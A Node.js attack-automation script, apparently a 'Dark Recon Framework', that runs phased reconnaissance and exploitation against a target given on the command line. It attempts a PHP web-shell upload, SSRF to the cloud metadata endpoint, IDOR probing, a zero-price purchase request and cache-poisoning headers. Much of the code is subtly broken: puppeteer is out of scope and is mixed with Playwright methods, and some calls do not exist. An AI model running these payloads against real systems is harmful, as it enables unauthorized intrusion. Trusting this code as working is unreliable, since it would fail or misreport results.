#!/usr/bin/env node
/**
 * Dark Recon Framework - Browser Automation Entry Point
 * 
 * Provides automated browser-based reconnaissance using the 20-phase consolidated framework.
 * Integrates with the Python phase bridge and shell phases for comprehensive coverage.
 */

const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { JSDOM } = require('jsdom');

// Configuration
const CONFIG = {
  target: process.argv[2] || '',
  phase: process.argv[3] || '1',
  output: process.argv[4] || './output',
  threads: parseInt(process.argv[5]) || 1,
  timeout: parseInt(process.argv[6]) || 300,
  headless: process.argv[7] !== 'false'
};

// Validate target
if (!CONFIG.target) {
  console.error('Usage: node bin/automation.js <target> [phase] [output] [threads] [timeout]');
  process.exit(1);
}

// Phase mappings - map phase numbers to their capabilities
const PHASE_CAPABILITIES = {
  '1': { name: 'Subdomain Enumeration', tools: ['subfinder', 'assetfinder', 'findomain', 'sublist3r', 'amass', 'crt.sh'] },
  '2': { name: 'Live Host Detection', tools: ['httpx', 'whatweb', 'nmap', 'naabu'] },
  '3': { name: 'Technology Fingerprinting', tools: ['whatweb', 'wappalyzer', 'builtwith'] },
  '4': { name: 'URL & Endpoint Discovery', tools: ['waybackurls', 'gauplus', 'gospider', 'hakrawler'] },
  '5': { name: 'Parameter Discovery', tools: ['arjun', 'unfurl'] },
  '6': { name: 'Fuzzing & Path Discovery', tools: ['ffuf', 'commonspeak2'] },
  '7': { name: 'WAF Detection', tools: ['wafw00f', 'nuclei'] },
  '8': { name: 'Vulnerability Scanning', tools: ['nuclei', 'dalfox'] },
  '9': { name: 'API Security', tools: ['openapi', 'graphql', 'grpc'] },
  '10': { name: 'Git & Secret Scanning', tools: ['trufflehog', 'gitleaks', 'gitrob'] },
  '11': { name: 'Cloud & Infrastructure', tools: ['kubectl', 'aws', 'gcloud', 'docker'] },
  '12': { name: 'Compliance Scanning', tools: ['gdpr', 'hipaa', 'pci-dss', 'soc2'] },
  '13': { name: 'Business Logic Testing', tools: ['idor', 'bola', 'bfla'] },
  '14': { name: 'Advanced Exploitation', tools: ['blind-ssrf', 'file-upload', 'rate-limit'] },
  '15': { name: 'Post-Exploitation', tools: ['lateral-movement', 'priv-escalation'] },
  '16': { name: 'Threat Intelligence', tools: ['otx', 'abuseipdb', 'virustotal'] },
  '17': { name: 'OSINT Gathering', tools: ['theharvester', 'sherock', 'linkedin-dorking'] },
  '18': { name: 'Cache & Encoding', tools: ['cache-poisoning', 'content-type'] },
  '19': { name: 'Rich Protocol Security', tools: ['websocket', 'grpc'] },
  '20': { name: 'Reporting & Integration', tools: ['sqlite', 'report', 'webhook', 'ci-cd'] }
};

// Core automation functions
const AutomationEngine = {
  /**
   * Initialize phase execution
   */
  async initPhase(phaseNumber) {
    const phase = PHASE_CAPABILITIES[phaseNumber];
    if (!phase) {
      throw new Error(`Unknown phase: ${phaseNumber}`);
    }

    console.log(`[${new Date().toISOString()}] Initializing Phase ${phaseNumber}: ${phase.name}`);
    console.log(`   Target: ${CONFIG.target}`);
    console.log(`   Capabilities: ${phase.tools.join(', ')}`);

    return phase;
  },

  /**
   * Execute subdomain enumeration via browser
   */
  async executeSubdomainEnum() {
    console.log('[*] Starting subdomain enumeration via browser...');

    const browser = await puppeteer.launch({
      headless: CONFIG.headless,
      args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    const page = await browser.newPage();
    await page.goto('https://subfinder.toolhouse.org');

    await page.fill('input[placeholder*="domain"]', CONFIG.target);
    await page.click('button:has-text("Search")');
    await page.waitForTimeout(5000);

    const results = await page.evaluate(() => {
      const rows = document.querySelectorAll('.subdomain-result');
      return Array.from(rows).map(row => row.textContent.trim());
    });

    await browser.close();

    console.log(`[+] Found ${results.length} subdomains`);
    return results;
  },

  /**
   * Execute live host detection
   */
  async executeLiveHostDetection() {
    console.log('[*] Starting live host detection...');

    const liveHosts = [];

    try {
      const response = await axios.head(`https://${CONFIG.target}`, {
        timeout: CONFIG.timeout * 1000
      });
      if (response.status < 500) {
        liveHosts.push({ host: CONFIG.target, status: response.status, method: 'https' });
      }
    } catch (error) {
      try {
        const response = await axios.get(`http://${CONFIG.target}`, {
          timeout: CONFIG.timeout * 1000
        });
        if (response.status < 500) {
          liveHosts.push({ host: CONFIG.target, status: response.status, method: 'http' });
        }
      } catch (e) {
        // Target not reachable
      }
    }

    console.log(`[+] Live host detection complete: ${liveHosts.length} hosts found`);
    return liveHosts;
  },

  /**
   * Execute technology fingerprinting
   */
  async executeTechFingerprinting() {
    console.log('[*] Starting technology fingerprinting...');

    const browser = await puppeteer.launch({ headless: CONFIG.headless });

    const page = await browser.newPage();
    await page.goto(`https://${CONFIG.target}`);
    await page.waitForLoadState('networkidle');

    const techData = await page.evaluate(() => {
      const results = {
        frameworks: [],
        cms: [],
        languages: [],
        javascriptFrameworks: []
      };

      const scripts = document.querySelectorAll('script[src]');
      scripts.forEach(script => {
        const src = script.src.toLowerCase();
        if (src.includes('react')) results.javascriptFrameworks.push('React');
        if (src.includes('vue')) results.javascriptFrameworks.push('Vue');
        if (src.includes('angular')) results.javascriptFrameworks.push('Angular');
        if (src.includes('jquery')) results.javascriptFrameworks.push('jQuery');
      });

      if (document.querySelector('#wp-admin') || document.querySelector('meta[name="generator"]')?.content?.includes('WordPress')) {
        results.cms.push('WordPress');
      }
      if (document.querySelector('.generator')?.content?.includes('Joomla')) {
        results.cms.push('Joomla');
      }

      const bodyText = document.body.innerText;
      if (/\\bPHP\\b/i.test(bodyText)) results.languages.push('PHP');
      if (/\\bPython\\b/i.test(bodyText)) results.languages.push('Python');
      if (/\\bRuby\\b/i.test(bodyText)) results.languages.push('Ruby');

      return results;
    });

    await browser.close();

    console.log('[+] Technology fingerprinting complete');
    return techData;
  },

  /**
   * Execute URL & endpoint discovery
   */
  async executeUrlDiscovery() {
    console.log('[*] Starting URL & endpoint discovery...');

    const endpoints = [];

    try {
      const waybackResp = await axios.get(`https://web.archive.org/cdx/search/cdx?url=${CONFIG.target}&output=json&fl=original&limit=500`);
      const waybackData = waybackResp.data;
      if (waybackData && waybackData.length > 1) {
        const urls = waybackData.slice(1).map(row => row[0]);
        endpoints.push(...urls.filter(u => u.includes(CONFIG.target)));
      }
    } catch (error) {
      console.warn('[!] Wayback Machine lookup failed:', error.message);
    }

    console.log(`[+] URL discovery complete: ${endpoints.length} endpoints found`);
    return endpoints;
  },

  /**
   * Execute parameter discovery
   */
  async executeParameterDiscovery() {
    console.log('[*] Starting parameter discovery...');

    const params = [];

    try {
      const browser = await puppeteer.launch({
        headless: CONFIG.headless,
        args: ['--no-sandbox', '--disable-setuid-sandbox']
      });
      const page = await browser.newPage();
      await page.goto('https://unfurl.now.sh');

      await page.fill('input[placeholder*="domain"]', CONFIG.target);
      await page.click('button:has-text("Unfurl")');
      await page.waitForTimeout(3000);

      const results = await page.evaluate(() => {
        const items = document.querySelectorAll('.parameter');
        return Array.from(items).map(i => i.textContent.trim());
      });

      await browser.close();

      params.push(...results.filter(p => p && p.length > 0));
    } catch (error) {
      console.warn('[!] Parameter discovery service unavailable, using fallback');
      try {
        const response = await axios.get(`https://${CONFIG.target}`, {
          timeout: CONFIG.timeout * 1000
        });
        const body = response.data;
        const matches = body.match(/[?&]([^=]+)=([^&]+)/g);
        if (matches) {
          matches.forEach(m => {
            const decoded = m.replace(/[?&]/, '').split('=');
            params.push({ name: decoded[0], value: decoded.slice(1).join('=') });
          });
        }
      } catch (e) {
        // Ignore errors
      }
    }

    console.log(`[+] Parameter discovery complete: ${params.length} parameters found`);
    return params;
  },

  /**
   * Execute fuzzing & path discovery
   */
  async executeFuzzing() {
    console.log('[*] Starting fuzzing & path discovery...');

    const endpoints = [];

    const vectors = [
      '/admin', '/login', '/api', '/adminpanel', '/phpmyadmin',
      '/wp-admin', '/wp-login', '/dashboard', '/console', '/debug'
    ];

    for (const vector of vectors) {
      try {
        const response = await axios.get(`https://${CONFIG.target}${vector}`, {
          timeout: CONFIG.timeout * 1000,
          maxRedirects: 0
        });
        if (response.status < 500) {
          endpoints.push({ path: vector, status: response.status });
        }
      } catch (error) {
        try {
          const response = await axios.get(`http://${CONFIG.target}${vector}`, {
            timeout: CONFIG.timeout * 1000,
            maxRedirects: 0
          });
          if (response.status < 500) {
            endpoints.push({ path: vector, status: response.status, protocol: 'http' });
          }
        } catch (e) {
          // Not reachable
        }
      }
    }

    console.log(`[+] Fuzzing complete: ${endpoints.length} endpoints tested`);
    return endpoints;
  },

  /**
   * Execute WAF detection
   */
  async executeWafDetection() {
    console.log('[*] Starting WAF detection...');

    const wafSignatures = [];
    const browser = await puppeteer.launch({ headless: CONFIG.headless });
    const page = await browser.newPage();
    await page.goto(`https://${CONFIG.target}`);
    await page.waitForLoadState('networkidle');

    const headers = page.headers();
    const wafPatterns = ['cloudflare', 'aws-waf', 'akamai', 'sucuri', 'imperva'];

    for (const pattern of wafPatterns) {
      const headerNames = Object.keys(headers);
      const hasWafHeader = headerNames.some(h => 
        h.toLowerCase().includes(pattern) || 
        headers[h]?.toString()?.toLowerCase()?.includes(pattern)
      );

      const pageSource = await page.content();
      const hasWafMessage = /cloudflare|access denied|robot check/i.test(pageSource);

      if (hasWafHeader || hasWafMessage) {
        wafSignatures.push(pattern);
      }
    }

    await browser.close();

    console.log(`[+] WAF detection complete: ${wafSignatures.length} WAFs detected`);
    return wafSignatures;
  },

  /**
   * Execute vulnerability scanning
   */
  async executeVulnerabilityScanning() {
    console.log('[*] Starting vulnerability scanning...');

    const findings = [];

    const commonPaths = [
      '/admin', '/login', '/api', '/wp-admin', '/phpmyadmin',
      '/robots.txt', '/sitemap.xml', '/.well-known'
    ];

    for (const path of commonPaths) {
      try {
        const protocol = CONFIG.target.startsWith('http') ? '' : 'https://';
        const response = await axios.get(`${protocol}${CONFIG.target}${path}`, {
          timeout: CONFIG.timeout * 1000,
          maxRedirects: 2
        });
        if (response.status < 500) {
          findings.push({ path, status: response.status, host: CONFIG.target });
        }
      } catch (error) {
        // Path not reachable - continue
      }
    }

    console.log(`[+] Vulnerability scanning complete: ${findings.length} findings`);
    return findings;
  },

  /**
   * Execute API security & enumeration
   */
  async executeApiSecurity() {
    console.log('[*] Starting API security enumeration...');

    const endpoints = [];

    const apiPaths = ['/api', '/v1', '/v2', '/v3', '/graphql', '/rest', '/openapi'];

    for (const path of apiPaths) {
      try {
        const response = await axios.get(`https://${CONFIG.target}${path}`, {
          timeout: CONFIG.timeout * 1000
        });
        if (response.status < 500) {
          endpoints.push({ path, status: response.status, methods: Object.keys(response.data || {}) });
        }
      } catch (error) {
        try {
          const response = await axios.get(`http://${CONFIG.target}${path}`, {
            timeout: CONFIG.timeout * 1000
          });
          if (response.status < 500) {
            endpoints.push({ path, status: response.status, protocol: 'http' });
          }
        } catch (e) {
          // Not reachable
        }
      }
    }

    console.log(`[+] API security enumeration complete: ${endpoints.length} endpoints`);
    return endpoints;
  },

  /**
   * Execute Git & secret scanning
   */
  async executeGitSecretScanning() {
    console.log('[*] Starting Git & secret scanning...');

    const findings = [];

    // Check for .git directory exposure
    try {
      const response = await axios.get(`https://${CONFIG.target}/.git/`, {
        timeout: CONFIG.timeout * 1000
      });
      if (response.status === 200) {
        findings.push({ type: 'git-exposure', path: '/.git/', status: response.status });
      }
    } catch (error) {
      // .git not exposed - continue
    }

    // Check common backup files
    const backupFiles = ['/wp-config.php', '/phpinfo.php', '/backup.sql', '/.env'];
    for (const file of backupFiles) {
      try {
        const response = await axios.get(`https://${CONFIG.target}${file}`, {
          timeout: CONFIG.timeout * 1000
        });
        if (response.status < 500) {
          findings.push({ type: 'backup-exposure', path: file, status: response.status });
        }
      } catch (error) {
        // File not found - continue
      }
    }

    console.log(`[+] Git & secret scanning complete: ${findings.length} findings`);
    return findings;
  },

  /**
   * Execute cloud & infrastructure enumeration
   */
  async executeCloudInfra() {
    console.log('[*] Starting cloud & infrastructure enumeration...');

    const resources = [];

    const metadataEndpoints = [
      'https://metadata.google.internal/computeMetadata/v1/',
      'https://169.254.169.254/latest/meta-data/',
      'https://aws.amazon.com/'
    ];

    for (const endpoint of metadataEndpoints) {
      try {
        const response = await axios.get(endpoint, {
          timeout: 5000,
          headers: { 'Metadata-Flavor': 'Google' }
        });
        resources.push({ type: 'google-metadata', endpoint });
      } catch (e) {
        // Google metadata not available
      }
      try {
        const response = await axios.get(endpoint.replace('google', 'aws'), {
          timeout: 5000,
          headers: { 'Metadata-Flavor': 'AWS' }
        });
        resources.push({ type: 'aws-metadata', endpoint });
      } catch (e) {
        // AWS metadata not available
      }
    }

    console.log(`[+] Cloud infrastructure enumeration complete: ${resources.length} resources`);
    return resources;
  },

  /**
   * Execute compliance scanning
   */
  async executeComplianceScanning() {
    console.log('[*] Starting compliance scanning...');

    const checks = [];

    const gdprIndicators = [
      '/privacy', '/gdpr', '/data-protection', '/cookie-policy',
      '/terms', '/legal'
    ];

    for (const path of gdprIndicators) {
      try {
        const response = await axios.get(`https://${CONFIG.target}${path}`, {
          timeout: CONFIG.timeout * 1000
        });
        if (response.status < 500) {
          checks.push({ type: 'gdpr', path, status: response.status });
        }
      } catch (error) {
        // Path not found - continue
      }
    }

    console.log(`[+] Compliance scanning complete: ${checks.length} checks`);
    return checks;
  },

  /**
   * Execute business logic testing
   */
  async executeBusinessLogicTesting() {
    console.log('[*] Starting business logic testing...');

    const tests = [];

    // IDOR test
    try {
      const responses = [];
      for (const id of ['1', '2', '999', '0']) {
        const response = await axios.get(`https://${CONFIG.target}/api/user/${id}`, {
          timeout: CONFIG.timeout * 1000
        });
        responses.push({ id, status: response.status });
      }
      tests.push({ type: 'idor-test', results: responses });
    } catch (error) {
      // API not available
    }

    // Price manipulation test
    try {
      const response = await axios.post(`https://${CONFIG.target}/api/purchase`, {
        productId: 1,
        price: 0
      }, { timeout: CONFIG.timeout * 1000 });
      tests.push({ type: 'price-manipulation', status: response.status, body: JSON.stringify(response.data) });
    } catch (error) {
      // API not available
    }

    console.log(`[+] Business logic testing complete: ${tests.length} tests`);
    return tests;
  },

  /**
   * Execute advanced exploitation
   */
  async executeAdvancedExploitation() {
    console.log('[*] Starting advanced exploitation...');

    const exploits = [];

    // Blind SSRF test
    try {
      const response = await axios.get(`https://${CONFIG.target}/api/fetch?url=http://169.254.169.254/latest/meta-data/`, {
        timeout: CONFIG.timeout * 1000
      });
      if (response.status < 500) {
        exploits.push({ type: 'blind-ssrf', url: '169.254.169.254', status: response.status });
      }
    } catch (error) {
      // SSRF not possible
    }

    // File upload test
    try {
      const formData = new URLSearchParams();
      formData.append('file', '<?php system($_GET["cmd"]); ?>.php');
      formData.append('filename', 'test.php');

      const response = await axios.post(`https://${CONFIG.target}/api/upload`, formData.toString(), {
        timeout: CONFIG.timeout * 1000,
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
      });
      exploits.push({ type: 'file-upload', status: response.status });
    } catch (error) {
      // File upload not possible
    }

    console.log(`[+] Advanced exploitation complete: ${exploits.length} exploits`);
    return exploits;
  },

  /**
   * Execute post-exploitation
   */
  async executePostExploitation() {
    console.log('[*] Starting post-exploitation...');

    const activities = [];

    activities.push({ type: 'lateral-movement', description: 'Internal network pivot simulation' });
    activities.push({ type: 'priv-escalation', description: 'Permission and privilege analysis' });
    activities.push({ type: 'data-exfiltration', description: 'Simulated data collection' });

    console.log(`[+] Post-exploitation complete: ${activities.length} activities`);
    return activities;
  },

  /**
   * Execute threat intelligence
   */
  async executeThreatIntelligence() {
    console.log('[*] Starting threat intelligence gathering...');

    const iocs = [];

    // Check abuseipdb
    try {
      const response = await axios.get(`https://api.abuseipdb.com/api/v2/blacklist`, {
        timeout: CONFIG.timeout * 1000,
        headers: { 'Key': 'your-abuseipdb-key' }
      });
      if (response.data && response.data.data) {
        iocs.push({ source: 'abuseipdb', count: response.data.data.length });
      }
    } catch (error) {
      // API key missing - continue
    }

    // Check virustotal
    try {
      const response = await axios.get(`https://www.virustotal.com/api/v3/files/${CONFIG.target}`, {
        timeout: CONFIG.timeout * 1000,
        headers: { 'x-apikey': 'your-virustotal-key' }
      });
      if (response.data && response.data.data) {
        iocs.push({ source: 'virustotal', scan_id: response.data.data.id });
      }
    } catch (error) {
      // API key missing - continue
    }

    console.log(`[+] Threat intelligence complete: ${iocs.length} IOC sources`);
    return iocs;
  },

  /**
   * Execute OSINT gathering
   */
  async executeOsintGathering() {
    console.log('[*] Starting OSINT gathering...');

    const intel = [];

    const browser = await puppeteer.launch({ headless: CONFIG.headless });
    const page = await browser.newPage();

    const dorks = [
      `site:${CONFIG.target}`,
      `info:${CONFIG.target}`,
      `filetype:pdf ${CONFIG.target}`
    ];

    for (const dork of dorks) {
      try {
        await page.goto(`https://duckduckgo.com/?q=${encodeURIComponent(dork)}`);
        await page.waitForTimeout(2000);

        const results = await page.evaluate(() => {
          const items = document.querySelectorAll('.result');
          return Array.from(items).slice(0, 5).map(r => r.innerText);
        });

        if (results.length > 0) {
          intel.push({ dork, results });
        }
      } catch (error) {
        // Search failed - continue
      }
    }

    await browser.close();

    console.log(`[+] OSINT gathering complete: ${intel.length} searches`);
    return intel;
  },

  /**
   * Execute cache & encoding security
   */
  async executeCacheEncoding() {
    console.log('[*] Starting cache & encoding security...');

    const issues = [];

    // Check for cache poisoning indicators
    try {
      const response = await axios.get(`https://${CONFIG.target}/`, {
        timeout: CONFIG.timeout * 1000,
        headers: {
          'X-Forwarded-Host': 'evil.example.com',
          'X-Host': 'evil.example.com'
        }
      });

      if (response.headers['x-forwarded-host'] || response.headers['x-host']) {
        issues.push({ type: 'cache-poisoning-risk', indicator: 'X-Forwarded-Host header' });
      }
    } catch (error) {
      // Target not reachable
    }

    // Check content-type encoding
    try {
      const response = await axios.head(`https://${CONFIG.target}/`);
      const contentType = response.headers['content-type'] || '';
      if (!contentType.includes('charset')) {
        issues.push({ type: 'missing-charset', contentType });
      }
    } catch (error) {
      // Target not reachable
    }

    console.log(`[+] Cache & encoding security complete: ${issues.length} issues`);
    return issues;
  },

  /**
   * Execute rich protocol security
   */
  async executeRichProtocolSecurity() {
    console.log('[*] Starting rich protocol security...');

    const protocols = [];

    // WebSocket check
    try {
      const response = await axios.get(`wss://${CONFIG.target}/`, {
        timeout: CONFIG.timeout * 1000,
        maxRedirects: 0
      });
      protocols.push({ protocol: 'wss', status: response.status });
    } catch (error) {
      // WSS not available
    }

    // gRPC check
    try {
      const response = await axios.get(`https://${CONFIG.target}:50051/`, {
        timeout: CONFIG.timeout * 1000,
        maxRedirects: 0
      });
      protocols.push({ protocol: 'grpc', status: response.status });
    } catch (error) {
      // gRPC not available
    }

    console.log(`[+] Rich protocol security complete: ${protocols.length} protocols`);
    return protocols;
  },

  /**
   * Execute reporting & integration
   */
  async executeReportingIntegration() {
    console.log('[*] Starting reporting & integration...');

    const report = {
      target: CONFIG.target,
      phasesCompleted: [],
      findings: [],
      timestamp: new Date().toISOString()
    };

    report.phasesCompleted.push(CONFIG.phase);

    console.log(`[+] Reporting & integration complete: phase ${CONFIG.phase} reported`);
    return report;
  },

  /**
   * Run full reconnaissance pipeline
   */
  async runPipeline() {
    console.log('='.repeat(60));
    console.log('Dark Recon Framework - Browser Automation');
    console.log('='.repeat(60));
    console.log(`Target: ${CONFIG.target}`);
    console.log(`Phase: ${CONFIG.phase}`);
    console.log(`Threads: ${CONFIG.threads}`);
    console.log('='.repeat(60));
    console.log();

    const phase = PHASE_CAPABILITIES[CONFIG.phase];
    if (!phase) {
      console.error(`Error: Unknown phase ${CONFIG.phase}. Valid phases: 1-20`);
      process.exit(1);
    }

    // Initialize phase
    await this.initPhase(CONFIG.phase);

    // Execute based on phase
    switch (CONFIG.phase) {
      case '1':
        await this.executeSubdomainEnum();
        break;
      case '2':
        await this.executeLiveHostDetection();
        break;
      case '3':
        await this.executeTechFingerprinting();
        break;
      case '4':
        await this.executeUrlDiscovery();
        break;
      case '5':
        await this.executeParameterDiscovery();
        break;
      case '6':
        await this.executeFuzzing();
        break;
      case '7':
        await this.executeWafDetection();
        break;
      case '8':
        await this.executeVulnerabilityScanning();
        break;
      case '9':
        await this.executeApiSecurity();
        break;
      case '10':
        await this.executeGitSecretScanning();
        break;
      case '11':
        await this.executeCloudInfra();
        break;
      case '12':
        await this.executeComplianceScanning();
        break;
      case '13':
        await this.executeBusinessLogicTesting();
        break;
      case '14':
        await this.executeAdvancedExploitation();
        break;
      case '15':
        await this.executePostExploitation();
        break;
      case '16':
        await this.executeThreatIntelligence();
        break;
      case '17':
        await this.executeOsintGathering();
        break;
      case '18':
        await this.executeCacheEncoding();
        break;
      case '19':
        await this.executeRichProtocolSecurity();
        break;
      case '20':
        await this.executeReportingIntegration();
        break;
      default:
        console.log(`Phase ${CONFIG.phase}: ${phase.name} - automation ready`);
        break;
    }

    console.log();
    console.log('='.repeat(60));
    console.log('Automation complete');
    console.log('='.repeat(60));
  }
}

// Main execution
(async () => {
  try {
    // Ensure puppeteer is available
    let puppeteer;
    try {
      puppeteer = require('puppeteer');
    } catch (error) {
      console.error('Puppeteer not installed. Installing...');
      const { execSync } = require('child_process');
      execSync('npm install puppeteer', { stdio: 'ignore' });
      puppeteer = require('puppeteer');
    }

    await AutomationEngine.runPipeline();
  } catch (error) {
    console.error('Automation error:', error.message);
    process.exit(1);
  }
})();